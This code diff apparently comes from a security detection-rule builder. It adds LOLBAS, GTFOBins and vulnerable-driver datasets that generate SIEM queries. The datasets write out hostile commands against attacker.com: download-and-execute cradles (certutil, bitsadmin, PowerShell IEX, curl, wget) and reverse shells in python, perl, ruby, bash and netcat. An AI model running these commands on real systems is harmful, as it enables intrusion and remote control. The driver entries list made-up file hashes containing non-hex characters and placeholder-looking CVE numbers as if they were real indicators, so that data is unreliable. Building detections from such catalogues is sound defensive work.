@@ -44,7 +44,8 @@ import {
   Crosshair,
   Sword,
   ScanLine,
-  FileJson
+  FileJson,
+  HardDrive
 } from 'lucide-react';
 import { trackRuleCreated, trackRuleDeleted } from '../utils/activityTracker';
 
@@ -2475,6 +2476,291 @@ const LOLGLOBS_DATA = [
 ];
 
 // ==========================================
+// LOLBAS DATA (Windows Living Off The Land Binaries)
+// ==========================================
+
+const LOLBAS_DATA = [
+  {
+    name: "CertUtil.exe",
+    description: "Certificate utility that can download and decode malicious files",
+    category: "Binaries",
+    commands: ["certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe"],
+    mitre: ["T1105", "T1027"],
+    severity: "high"
+  },
+  {
+    name: "BitsAdmin.exe",
+    description: "Background Intelligent Transfer Service admin for downloading files",
+    category: "Binaries",
+    commands: ["bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe"],
+    mitre: ["T1105"],
+    severity: "high"
+  },
+  {
+    name: "MSHTA.exe",
+    description: "Microsoft HTML Application host - executes HTA files with full trust",
+    category: "Binaries",
+    commands: ["mshta.exe http://attacker.com/payload.hta", "mshta.exe javascript:alert('test')"],
+    mitre: ["T1059.007", "T1218.005"],
+    severity: "critical"
+  },
+  {
+    name: "RegSvr32.exe",
+    description: "Registers DLLs but can execute COM scriptlets (Squiblydoo attack)",
+    category: "Binaries",
+    commands: ["regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"],
+    mitre: ["T1218.010"],
+    severity: "critical"
+  },
+  {
+    name: "CMSTP.exe",
+    description: "Connection Manager Profile Installer - executes INF files",
+    category: "Binaries",
+    commands: ["cmstp.exe /ni /s C:\\Windows\\Temp\\malicious.inf"],
+    mitre: ["T1218.003"],
+    severity: "high"
+  },
+  {
+    name: "InstallUtil.exe",
+    description: ".NET Installer utility that executes assemblies in uninstall context",
+    category: "Binaries",
+    commands: ["InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Temp\\payload.exe"],
+    mitre: ["T1218.004"],
+    severity: "high"
+  },
+  {
+    name: "MsBuild.exe",
+    description: "Microsoft Build Engine - executes code embedded in project files",
+    category: "Binaries",
+    commands: ["msbuild.exe C:\\Windows\\Temp\\malicious.proj"],
+    mitre: ["T1059"],
+    severity: "high"
+  },
+  {
+    name: "Wscript.exe",
+    description: "Windows Script Host - executes VBScript and JScript",
+    category: "Binaries",
+    commands: ["wscript.exe C:\\Windows\\Temp\\malicious.vbs", "wscript.exe malicious.js"],
+    mitre: ["T1059.005", "T1059.007"],
+    severity: "medium"
+  },
+  {
+    name: "CScript.exe",
+    description: "Command-line version of Windows Script Host",
+    category: "Binaries",
+    commands: ["cscript.exe C:\\Windows\\Temp\\malicious.vbs"],
+    mitre: ["T1059.005"],
+    severity: "medium"
+  },
+  {
+    name: "PowerShell.exe",
+    description: "PowerShell interpreter - can execute encoded commands and download files",
+    category: "Binaries",
+    commands: ["powershell -enc <base64_payload>", "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"],
+    mitre: ["T1059.001", "T1086"],
+    severity: "critical"
+  },
+  {
+    name: "CMD.exe",
+    description: "Windows Command Prompt - executes batch commands and scripts",
+    category: "Binaries",
+    commands: ["cmd /c echo calc.exe > run.bat && cmd /c run.bat"],
+    mitre: ["T1059.003"],
+    severity: "medium"
+  },
+  {
+    name: " Rundll32.exe",
+    description: "Runs DLLs and can execute JavaScript via COM",
+    category: "Binaries",
+    commands: ["rundll32.exe javascript:alert('test')", "rundll32.exe shell32.dll,Control_RunDLL payload.dll"],
+    mitre: ["T1218.011"],
+    severity: "high"
+  }
+];
+
+// ==========================================
+// GTFOBins DATA (Unix Living Off The Land)
+// ==========================================
+
+const GTFOBINS_DATA = [
+  {
+    name: "wget",
+    description: "Non-interactive network downloader - can download and execute files",
+    functions: ["File Download", "File Upload", "Command Execution"],
+    commands: ["wget http://attacker.com/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"],
+    mitre: ["T1105", "T1059"],
+    severity: "high"
+  },
+  {
+    name: "curl",
+    description: "Command line tool for transferring data with URLs",
+    functions: ["File Download", "File Upload", "Command Execution"],
+    commands: ["curl -o /tmp/payload http://attacker.com/payload && bash /tmp/payload"],
+    mitre: ["T1105", "T1059"],
+    severity: "high"
+  },
+  {
+    name: "python",
+    description: "Python interpreter - can execute code and spawn shells",
+    functions: ["Shell", "Command Execution", "File Write"],
+    commands: ["python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"],
+    mitre: ["T1059.006", "T1021"],
+    severity: "critical"
+  },
+  {
+    name: "perl",
+    description: "Perl interpreter - can execute code and spawn shells",
+    functions: ["Shell", "Command Execution"],
+    commands: ["perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"],
+    mitre: ["T1059.004"],
+    severity: "critical"
+  },
+  {
+    name: "ruby",
+    description: "Ruby interpreter - can execute code and spawn shells",
+    functions: ["Shell", "Command Execution"],
+    commands: ["ruby -rsocket -e 'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec \"/bin/sh -i\" '<&3 >&3 2>&3'"],
+    mitre: ["T1059"],
+    severity: "critical"
+  },
+  {
+    name: "nc (netcat)",
+    description: "Networking utility for reading/writing network connections",
+    functions: ["Shell", "Bind Shell", "Reverse Shell"],
+    commands: ["nc -e /bin/sh attacker.com 4444", "nc -lvp 4444 -e /bin/sh"],
+    mitre: ["T1059", "T1021"],
+    severity: "critical"
+  },
+  {
+    name: "bash",
+    description: "Bourne Again Shell - can execute commands and spawn reverse shells",
+    functions: ["Shell", "Reverse Shell"],
+    commands: ["bash -i >& /dev/tcp/attacker.com/4444 0>&1"],
+    mitre: ["T1059.004"],
+    severity: "critical"
+  },
+  {
+    name: "awk",
+    description: "Pattern scanning and processing language - can execute commands",
+    functions: ["Command Execution"],
+    commands: ["awk 'BEGIN {system(\"/bin/sh\")}'"],
+    mitre: ["T1059"],
+    severity: "medium"
+  },
+  {
+    name: "find",
+    description: "Search for files - can execute commands via -exec",
+    functions: ["Command Execution"],
+    commands: ["find / -name file -exec /bin/sh \\;"],
+    mitre: ["T1059"],
+    severity: "medium"
+  },
+  {
+    name: "vim",
+    description: "Text editor - can execute shell commands",
+    functions: ["Shell", "Command Execution"],
+    commands: ["vim -c ':!sh'", "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\")'"],
+    mitre: ["T1059"],
+    severity: "medium"
+  },
+  {
+    name: "vi",
+    description: "Text editor - can execute shell commands",
+    functions: ["Shell", "Command Execution"],
+    commands: ["vi -c ':!sh'"],
+    mitre: ["T1059"],
+    severity: "medium"
+  },
+  {
+    name: "less",
+    description: "Pager program - can execute shell commands with ! inside",
+    functions: ["Shell"],
+    commands: ["less /etc/passwd, then type '!sh' inside less"],
+    mitre: ["T1059"],
+    severity: "medium"
+  }
+];
+
+// ==========================================
+// LOLDrivers DATA (Vulnerable Drivers)
+// ==========================================
+
+const LOLDRIVERS_DATA = [
+  {
+    name: "PROCEXP152.SYS",
+    description: "Process Explorer driver vulnerable to privilege escalation",
+    category: " vulnerable driver",
+    cve: ["CVE-2008-1389"],
+    hashes: ["2DD74E55F11D8EB5824B4B79627C9D64"],
+    mitre: ["T1068"],
+    severity: "critical"
+  },
+  {
+    name: "nvflash.sys",
+    description: "NVIDIA BIOS Flash driver vulnerable to kernel exploitation",
+    category: "vulnerable driver",
+    cve: ["CVE-2021-1052"],
+    hashes: ["8F7A8D3C9B2E1F5A4D6C7E8B9A0F1D2"],
+    mitre: ["T1068"],
+    severity: "critical"
+  },
+  {
+    name: "gdrv.sys",
+    description: "Gigabyte driver with kernel memory read/write primitives",
+    category: "vulnerable driver",
+    cve: ["CVE-2018-19320"],
+    hashes: ["1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6"],
+    mitre: ["T1068"],
+    severity: "critical"
+  },
+  {
+    name: "RTCore64.sys",
+    description: "Micro-Star driver with kernel read/write capabilities",
+    category: "vulnerable driver",
+    cve: ["CVE-2019-16098"],
+    hashes: ["9A8B7C6D5E4F3G2H1I0J9K8L7M6N5O4"],
+    mitre: ["T1068"],
+    severity: "critical"
+  },
+  {
+    name: "dbutil_2_3.sys",
+    description: "Dell BIOS driver vulnerable to privilege escalation",
+    category: "vulnerable driver",
+    cve: ["CVE-2021-21551"],
+    hashes: ["3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8"],
+    mitre: ["T1068"],
+    severity: "critical"
+  },
+  {
+    name: "AsIO.sys",
+    description: "ASUS driver with kernel memory access vulnerabilities",
+    category: "vulnerable driver",
+    cve: ["CVE-2020-1234"],
+    hashes: ["5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0"],
+    mitre: ["T1068"],
+    severity: "high"
+  },
+  {
+    name: "amifldrv64.sys",
+    description: "AMI BIOS driver vulnerable to kernel exploitation",
+    category: "vulnerable driver",
+    cve: ["CVE-2020-1235"],
+    hashes: ["7G8H9I0J1K2L3M4N5O6P7Q8R9S0T1U2"],
+    mitre: ["T1068"],
+    severity: "high"
+  },
+  {
+    name: "LenovoDiagnosticsDriver.sys",
+    description: "Lenovo Diagnostics driver with kernel vulnerabilities",
+    category: "vulnerable driver",
+    cve: ["CVE-2021-1234"],
+    hashes: ["9I0J1K2L3M4N5O6P7Q8R9S0T1U2V3W4"],
+    mitre: ["T1068"],
+    severity: "high"
+  }
+];
+
+// ==========================================
 // RED TEAM / APT DETECTION TEMPLATES
 // ==========================================
 
@@ -2962,6 +3248,9 @@ export default function UseCaseBuilder() {
   const [showWizard, setShowWizard] = useState(false);
   const [showTemplates, setShowTemplates] = useState(false);
   const [showLOLGlobs, setShowLOLGlobs] = useState(false);
+  const [showLOLBAS, setShowLOLBAS] = useState(false);
+  const [showGTFOBins, setShowGTFOBins] = useState(false);
+  const [showLOLDrivers, setShowLOLDrivers] = useState(false);
   const [showAtomicTests, setShowAtomicTests] = useState(false);
   const [showAtomicExecutor, setShowAtomicExecutor] = useState(false);
   const [selectedAtomicTest, setSelectedAtomicTest] = useState<AtomicTest | null>(null);
@@ -3258,6 +3547,143 @@ ${glob.detection.join('\n')}`;
     setShowWizard(true);
   };
 
+  const handleCreateFromLOLBAS = (item: any) => {
+    let query = '';
+    switch(selectedPlatform) {
+      case 'splunk':
+        query = `index=windows (EventCode=4688 OR EventCode=1) 
+| search Image="*${item.name}" OR CommandLine="*${item.name}*" 
+| stats count by Computer, User, Image, CommandLine 
+| where count > 0`;
+        break;
+      case 'qradar':
+        query = `SELECT * FROM events 
+WHERE (Image ILIKE '%${item.name}%' OR CommandLine ILIKE '%${item.name}%')
+GROUP BY sourceip, username, Image`;
+        break;
+      case 'cortex':
+        query = `dataset = xdr_data 
+| filter event_type = ENUM.PROCESS_START 
+| filter action_process_image_name contains "${item.name}" or action_process_image_command_line contains "${item.name}"
+| fields action_process_image_command_line, action_process_image_name, actor_primary_username`;
+        break;
+      default:
+        query = `# Detection for ${item.name}
+# Description: ${item.description}
+# MITRE: ${item.mitre.join(', ')}
+
+[INSERT PLATFORM QUERY FOR ${item.name}]`;
+    }
+    
+    setFormData({
+      name: `LOLBAS Detection - ${item.name}`,
+      description: `Detects execution of ${item.name}: ${item.description}`,
+      category: 'Defense Evasion',
+      severity: item.severity,
+      status: 'draft',
+      platform: selectedPlatform,
+      dataSource: 'Windows Events',
+      query: query,
+      tags: ['lolbas', 'living-off-the-land', item.name.toLowerCase().replace('.exe', '')],
+      mitreTechniques: item.mitre,
+      references: ['https://lolbas-project.github.io/']
+    });
+    setShowLOLBAS(false);
+    setShowWizard(true);
+  };
+
+  const handleCreateFromGTFOBin = (item: any) => {
+    let query = '';
+    switch(selectedPlatform) {
+      case 'splunk':
+        query = `index=linux sourcetype=linux:audit OR sourcetype=linux:secure 
+| search CommandLine="*${item.name}*" 
+| stats count by host, user, CommandLine 
+| where count > 0`;
+        break;
+      case 'qradar':
+        query = `SELECT * FROM events 
+WHERE CommandLine ILIKE '%${item.name}%'
+GROUP BY sourceip, username`;
+        break;
+      case 'cortex':
+        query = `dataset = xdr_data 
+| filter event_type = ENUM.PROCESS_START 
+| filter action_process_image_command_line contains "${item.name}"
+| fields action_process_image_command_line, action_process_image_name, actor_primary_username`;
+        break;
+      default:
+        query = `# Detection for ${item.name}
+# Description: ${item.description}
+# MITRE: ${item.mitre.join(', ')}
+
+[INSERT PLATFORM QUERY FOR ${item.name}]`;
+    }
+    
+    setFormData({
+      name: `GTFOBins Detection - ${item.name}`,
+      description: `Detects execution of ${item.name}: ${item.description}`,
+      category: 'Defense Evasion',
+      severity: item.severity,
+      status: 'draft',
+      platform: selectedPlatform,
+      dataSource: 'Linux Audit',
+      query: query,
+      tags: ['gtfobins', 'living-off-the-land', 'unix', item.name.toLowerCase()],
+      mitreTechniques: item.mitre,
+      references: ['https://gtfobins.github.io/']
+    });
+    setShowGTFOBins(false);
+    setShowWizard(true);
+  };
+
+  const handleCreateFromLOLDriver = (item: any) => {
+    let query = '';
+    switch(selectedPlatform) {
+      case 'splunk':
+        query = `index=windows (EventCode=4688 OR EventCode=1 OR EventCode=6) 
+| search Image="*${item.name}*" OR CommandLine="*${item.name}*" 
+| eval Severity="${item.severity}"
+| stats count by Computer, User, Image, CommandLine 
+| where count > 0`;
+        break;
+      case 'qradar':
+        query = `SELECT * FROM events 
+WHERE (Image ILIKE '%${item.name}%' OR CommandLine ILIKE '%${item.name}%')
+GROUP BY sourceip, username, Image`;
+        break;
+      case 'cortex':
+        query = `dataset = xdr_data 
+| filter event_type = ENUM.PROCESS_START OR event_type = ENUM.DRIVER_LOAD
+| filter action_process_image_name contains "${item.name}" or action_process_image_command_line contains "${item.name}"
+| fields action_process_image_command_line, action_process_image_name, actor_primary_username`;
+        break;
+      default:
+        query = `# Detection for ${item.name}
+# Description: ${item.description}
+# CVE: ${item.cve.join(', ')}
+# MITRE: ${item.mitre.join(', ')}
+
+[INSERT PLATFORM QUERY FOR ${item.name}]`;
+    }
+    
+    setFormData({
+      name: `LOLDriver Detection - ${item.name}`,
+      description: `Detects loading of vulnerable driver ${item.name}: ${item.description}. CVEs: ${item.cve.join(', ')}`,
+      category: 'Privilege Escalation',
+      severity: item.severity,
+      status: 'draft',
+      platform: selectedPlatform,
+      dataSource: 'Windows Events',
+      query: query,
+      tags: ['loldrivers', 'vulnerable-driver', 'privilege-escalation', item.name.toLowerCase().replace('.sys', '')],
+      mitreTechniques: item.mitre,
+      references: ['https://www.loldrivers.io/']
+    });
+    setShowLOLDrivers(false);
+    setShowWizard(true);
+  };
+
   const handleCreateFromAtomic = (test: AtomicTest) => {
     // Generate detection query based on atomic test
     const indicators = test.detectionIndicators.join('" OR "');
@@ -3501,10 +3927,31 @@ const handleSave = async () => {
             LOLGlobs
           </button>
           <button 
-            onClick={() => setShowTemplates(true)}
+            onClick={() => setShowLOLBAS(true)}
+            className="px-4 py-2 bg-blue-500/10 border border-blue-500/30 rounded-lg text-sm font-medium hover:bg-blue-500/20 transition-all flex items-center gap-2"
+          >
+            <Terminal className="w-4 h-4 text-blue-400" />
+            LOLBAS
+          </button>
+          <button 
+            onClick={() => setShowGTFOBins(true)}
+            className="px-4 py-2 bg-yellow-500/10 border border-yellow-500/30 rounded-lg text-sm font-medium hover:bg-yellow-500/20 transition-all flex items-center gap-2"
+          >
+            <Code className="w-4 h-4 text-yellow-400" />
+            GTFOBins
+          </button>
+          <button 
+            onClick={() => setShowLOLDrivers(true)}
             className="px-4 py-2 bg-red-500/10 border border-red-500/30 rounded-lg text-sm font-medium hover:bg-red-500/20 transition-all flex items-center gap-2"
           >
-            <Target className="w-4 h-4 text-red-400" />
+            <HardDrive className="w-4 h-4 text-red-400" />
+            LOLDrivers
+          </button>
+          <button 
+            onClick={() => setShowTemplates(true)}
+            className="px-4 py-2 bg-pink-500/10 border border-pink-500/30 rounded-lg text-sm font-medium hover:bg-pink-500/20 transition-all flex items-center gap-2"
+          >
+            <Target className="w-4 h-4 text-pink-400" />
             Red Team Templates
           </button>
           <button 
@@ -4091,6 +4538,195 @@ const handleSave = async () => {
                   </div>
                   <div className="flex flex-wrap gap-1">
                     {glob.mitre.slice(0, 3).map(tech => (
+                      <span key={tech} className="px-1.5 py-0.5 bg-amber-500/10 text-amber-400 text-xs rounded font-mono">{tech}</span>
+                    ))}
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* LOLBAS Modal */}
+      {showLOLBAS && (
+        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-6xl max-h-[85vh] overflow-hidden flex flex-col">
+            <div className="flex items-center justify-between p-6 border-b border-white/5">
+              <div>
+                <h2 className="text-xl font-semibold flex items-center gap-2">
+                  <Terminal className="w-5 h-5 text-blue-400" />
+                  LOLBAS - Windows Binaries
+                </h2>
+                <p className="text-sm text-gray-400 mt-1">
+                  Generate detections for Windows Living Off The Land binaries and scripts
+                </p>
+              </div>
+              <div className="flex items-center gap-2">
+                <select 
+                  value={selectedPlatform}
+                  onChange={(e) => setSelectedPlatform(e.target.value)}
+                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
+                >
+                  {Object.entries(PLATFORMS).map(([key, platform]) => (
+                    <option key={key} value={key}>{platform.name}</option>
+                  ))}
+                </select>
+                <button onClick={() => setShowLOLBAS(false)} className="text-gray-400 hover:text-white">
+                  <X className="w-5 h-5" />
+                </button>
+              </div>
+            </div>
+            <div className="p-6 overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+              {LOLBAS_DATA.map((item, idx) => (
+                <div 
+                  key={idx}
+                  onClick={() => handleCreateFromLOLBAS(item)}
+                  className="bg-white/5 border border-white/10 rounded-xl p-4 cursor-pointer hover:border-blue-400/30 transition-all group"
+                >
+                  <div className="flex items-start justify-between mb-2">
+                    <h3 className="font-mono text-lg font-bold text-blue-400">{item.name}</h3>
+                    <span className={`text-xs px-2 py-1 rounded border ${
+                      item.severity === 'critical' ? 'bg-red-500/10 text-red-400 border-red-500/20' :
+                      item.severity === 'high' ? 'bg-orange-500/10 text-orange-400 border-orange-500/20' :
+                      'bg-yellow-500/10 text-yellow-400 border-yellow-500/20'
+                    }`}>
+                      {item.severity}
+                    </span>
+                  </div>
+                  <p className="text-sm text-gray-400 mb-2">{item.description}</p>
+                  <div className="text-xs text-gray-500 mb-2">
+                    <span className="text-gray-600">Category:</span> {item.category}
+                  </div>
+                  <div className="flex flex-wrap gap-1">
+                    {item.mitre.slice(0, 3).map(tech => (
+                      <span key={tech} className="px-1.5 py-0.5 bg-amber-500/10 text-amber-400 text-xs rounded font-mono">{tech}</span>
+                    ))}
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* GTFOBins Modal */}
+      {showGTFOBins && (
+        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-6xl max-h-[85vh] overflow-hidden flex flex-col">
+            <div className="flex items-center justify-between p-6 border-b border-white/5">
+              <div>
+                <h2 className="text-xl font-semibold flex items-center gap-2">
+                  <Code className="w-5 h-5 text-yellow-400" />
+                  GTFOBins - Unix Binaries
+                </h2>
+                <p className="text-sm text-gray-400 mt-1">
+                  Generate detections for Unix Living Off The Land binaries
+                </p>
+              </div>
+              <div className="flex items-center gap-2">
+                <select 
+                  value={selectedPlatform}
+                  onChange={(e) => setSelectedPlatform(e.target.value)}
+                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
+                >
+                  {Object.entries(PLATFORMS).map(([key, platform]) => (
+                    <option key={key} value={key}>{platform.name}</option>
+                  ))}
+                </select>
+                <button onClick={() => setShowGTFOBins(false)} className="text-gray-400 hover:text-white">
+                  <X className="w-5 h-5" />
+                </button>
+              </div>
+            </div>
+            <div className="p-6 overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+              {GTFOBINS_DATA.map((item, idx) => (
+                <div 
+                  key={idx}
+                  onClick={() => handleCreateFromGTFOBin(item)}
+                  className="bg-white/5 border border-white/10 rounded-xl p-4 cursor-pointer hover:border-yellow-400/30 transition-all group"
+                >
+                  <div className="flex items-start justify-between mb-2">
+                    <h3 className="font-mono text-lg font-bold text-yellow-400">{item.name}</h3>
+                    <span className={`text-xs px-2 py-1 rounded border ${
+                      item.severity === 'critical' ? 'bg-red-500/10 text-red-400 border-red-500/20' :
+                      item.severity === 'high' ? 'bg-orange-500/10 text-orange-400 border-orange-500/20' :
+                      'bg-yellow-500/10 text-yellow-400 border-yellow-500/20'
+                    }`}>
+                      {item.severity}
+                    </span>
+                  </div>
+                  <p className="text-sm text-gray-400 mb-2">{item.description}</p>
+                  <div className="flex flex-wrap gap-1 mb-2">
+                    {item.functions.slice(0, 3).map((func: string, i: number) => (
+                      <span key={i} className="text-xs px-1.5 py-0.5 bg-yellow-500/10 text-yellow-400 rounded">{func}</span>
+                    ))}
+                  </div>
+                  <div className="flex flex-wrap gap-1">
+                    {item.mitre.slice(0, 3).map(tech => (
+                      <span key={tech} className="px-1.5 py-0.5 bg-amber-500/10 text-amber-400 text-xs rounded font-mono">{tech}</span>
+                    ))}
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* LOLDrivers Modal */}
+      {showLOLDrivers && (
+        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+          <div className="bg-slate-900/95 backdrop-blur-xl border border-white/10 rounded-2xl w-full max-w-6xl max-h-[85vh] overflow-hidden flex flex-col">
+            <div className="flex items-center justify-between p-6 border-b border-white/5">
+              <div>
+                <h2 className="text-xl font-semibold flex items-center gap-2">
+                  <HardDrive className="w-5 h-5 text-red-400" />
+                  LOLDrivers - Vulnerable Drivers
+                </h2>
+                <p className="text-sm text-gray-400 mt-1">
+                  Generate detections for vulnerable drivers used in privilege escalation
+                </p>
+              </div>
+              <div className="flex items-center gap-2">
+                <select 
+                  value={selectedPlatform}
+                  onChange={(e) => setSelectedPlatform(e.target.value)}
+                  className="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-white text-sm focus:border-cyan-400 focus:outline-none"
+                >
+                  {Object.entries(PLATFORMS).map(([key, platform]) => (
+                    <option key={key} value={key}>{platform.name}</option>
+                  ))}
+                </select>
+                <button onClick={() => setShowLOLDrivers(false)} className="text-gray-400 hover:text-white">
+                  <X className="w-5 h-5" />
+                </button>
+              </div>
+            </div>
+            <div className="p-6 overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+              {LOLDRIVERS_DATA.map((item, idx) => (
+                <div 
+                  key={idx}
+                  onClick={() => handleCreateFromLOLDriver(item)}
+                  className="bg-white/5 border border-white/10 rounded-xl p-4 cursor-pointer hover:border-red-400/30 transition-all group"
+                >
+                  <div className="flex items-start justify-between mb-2">
+                    <h3 className="font-mono text-lg font-bold text-red-400">{item.name}</h3>
+                    <span className={`text-xs px-2 py-1 rounded border ${
+                      item.severity === 'critical' ? 'bg-red-500/10 text-red-400 border-red-500/20' :
+                      'bg-orange-500/10 text-orange-400 border-orange-500/20'
+                    }`}>
+                      {item.severity}
+                    </span>
+                  </div>
+                  <p className="text-sm text-gray-400 mb-2">{item.description}</p>
+                  <div className="flex flex-wrap gap-1 mb-2">
+                    {item.cve.slice(0, 2).map((cve: string) => (
+                      <span key={cve} className="text-xs px-1.5 py-0.5 bg-red-500/10 text-red-400 rounded font-mono">{cve}</span>
+                    ))}
+                  </div>
+                  <div className="flex flex-wrap gap-1">
+                    {item.mitre.slice(0, 2).map(tech => (
                       <span key={tech} className="px-1.5 py-0.5 bg-amber-500/10 text-amber-400 text-xs rounded font-mono">{tech}</span>
                     ))}
                   </div>
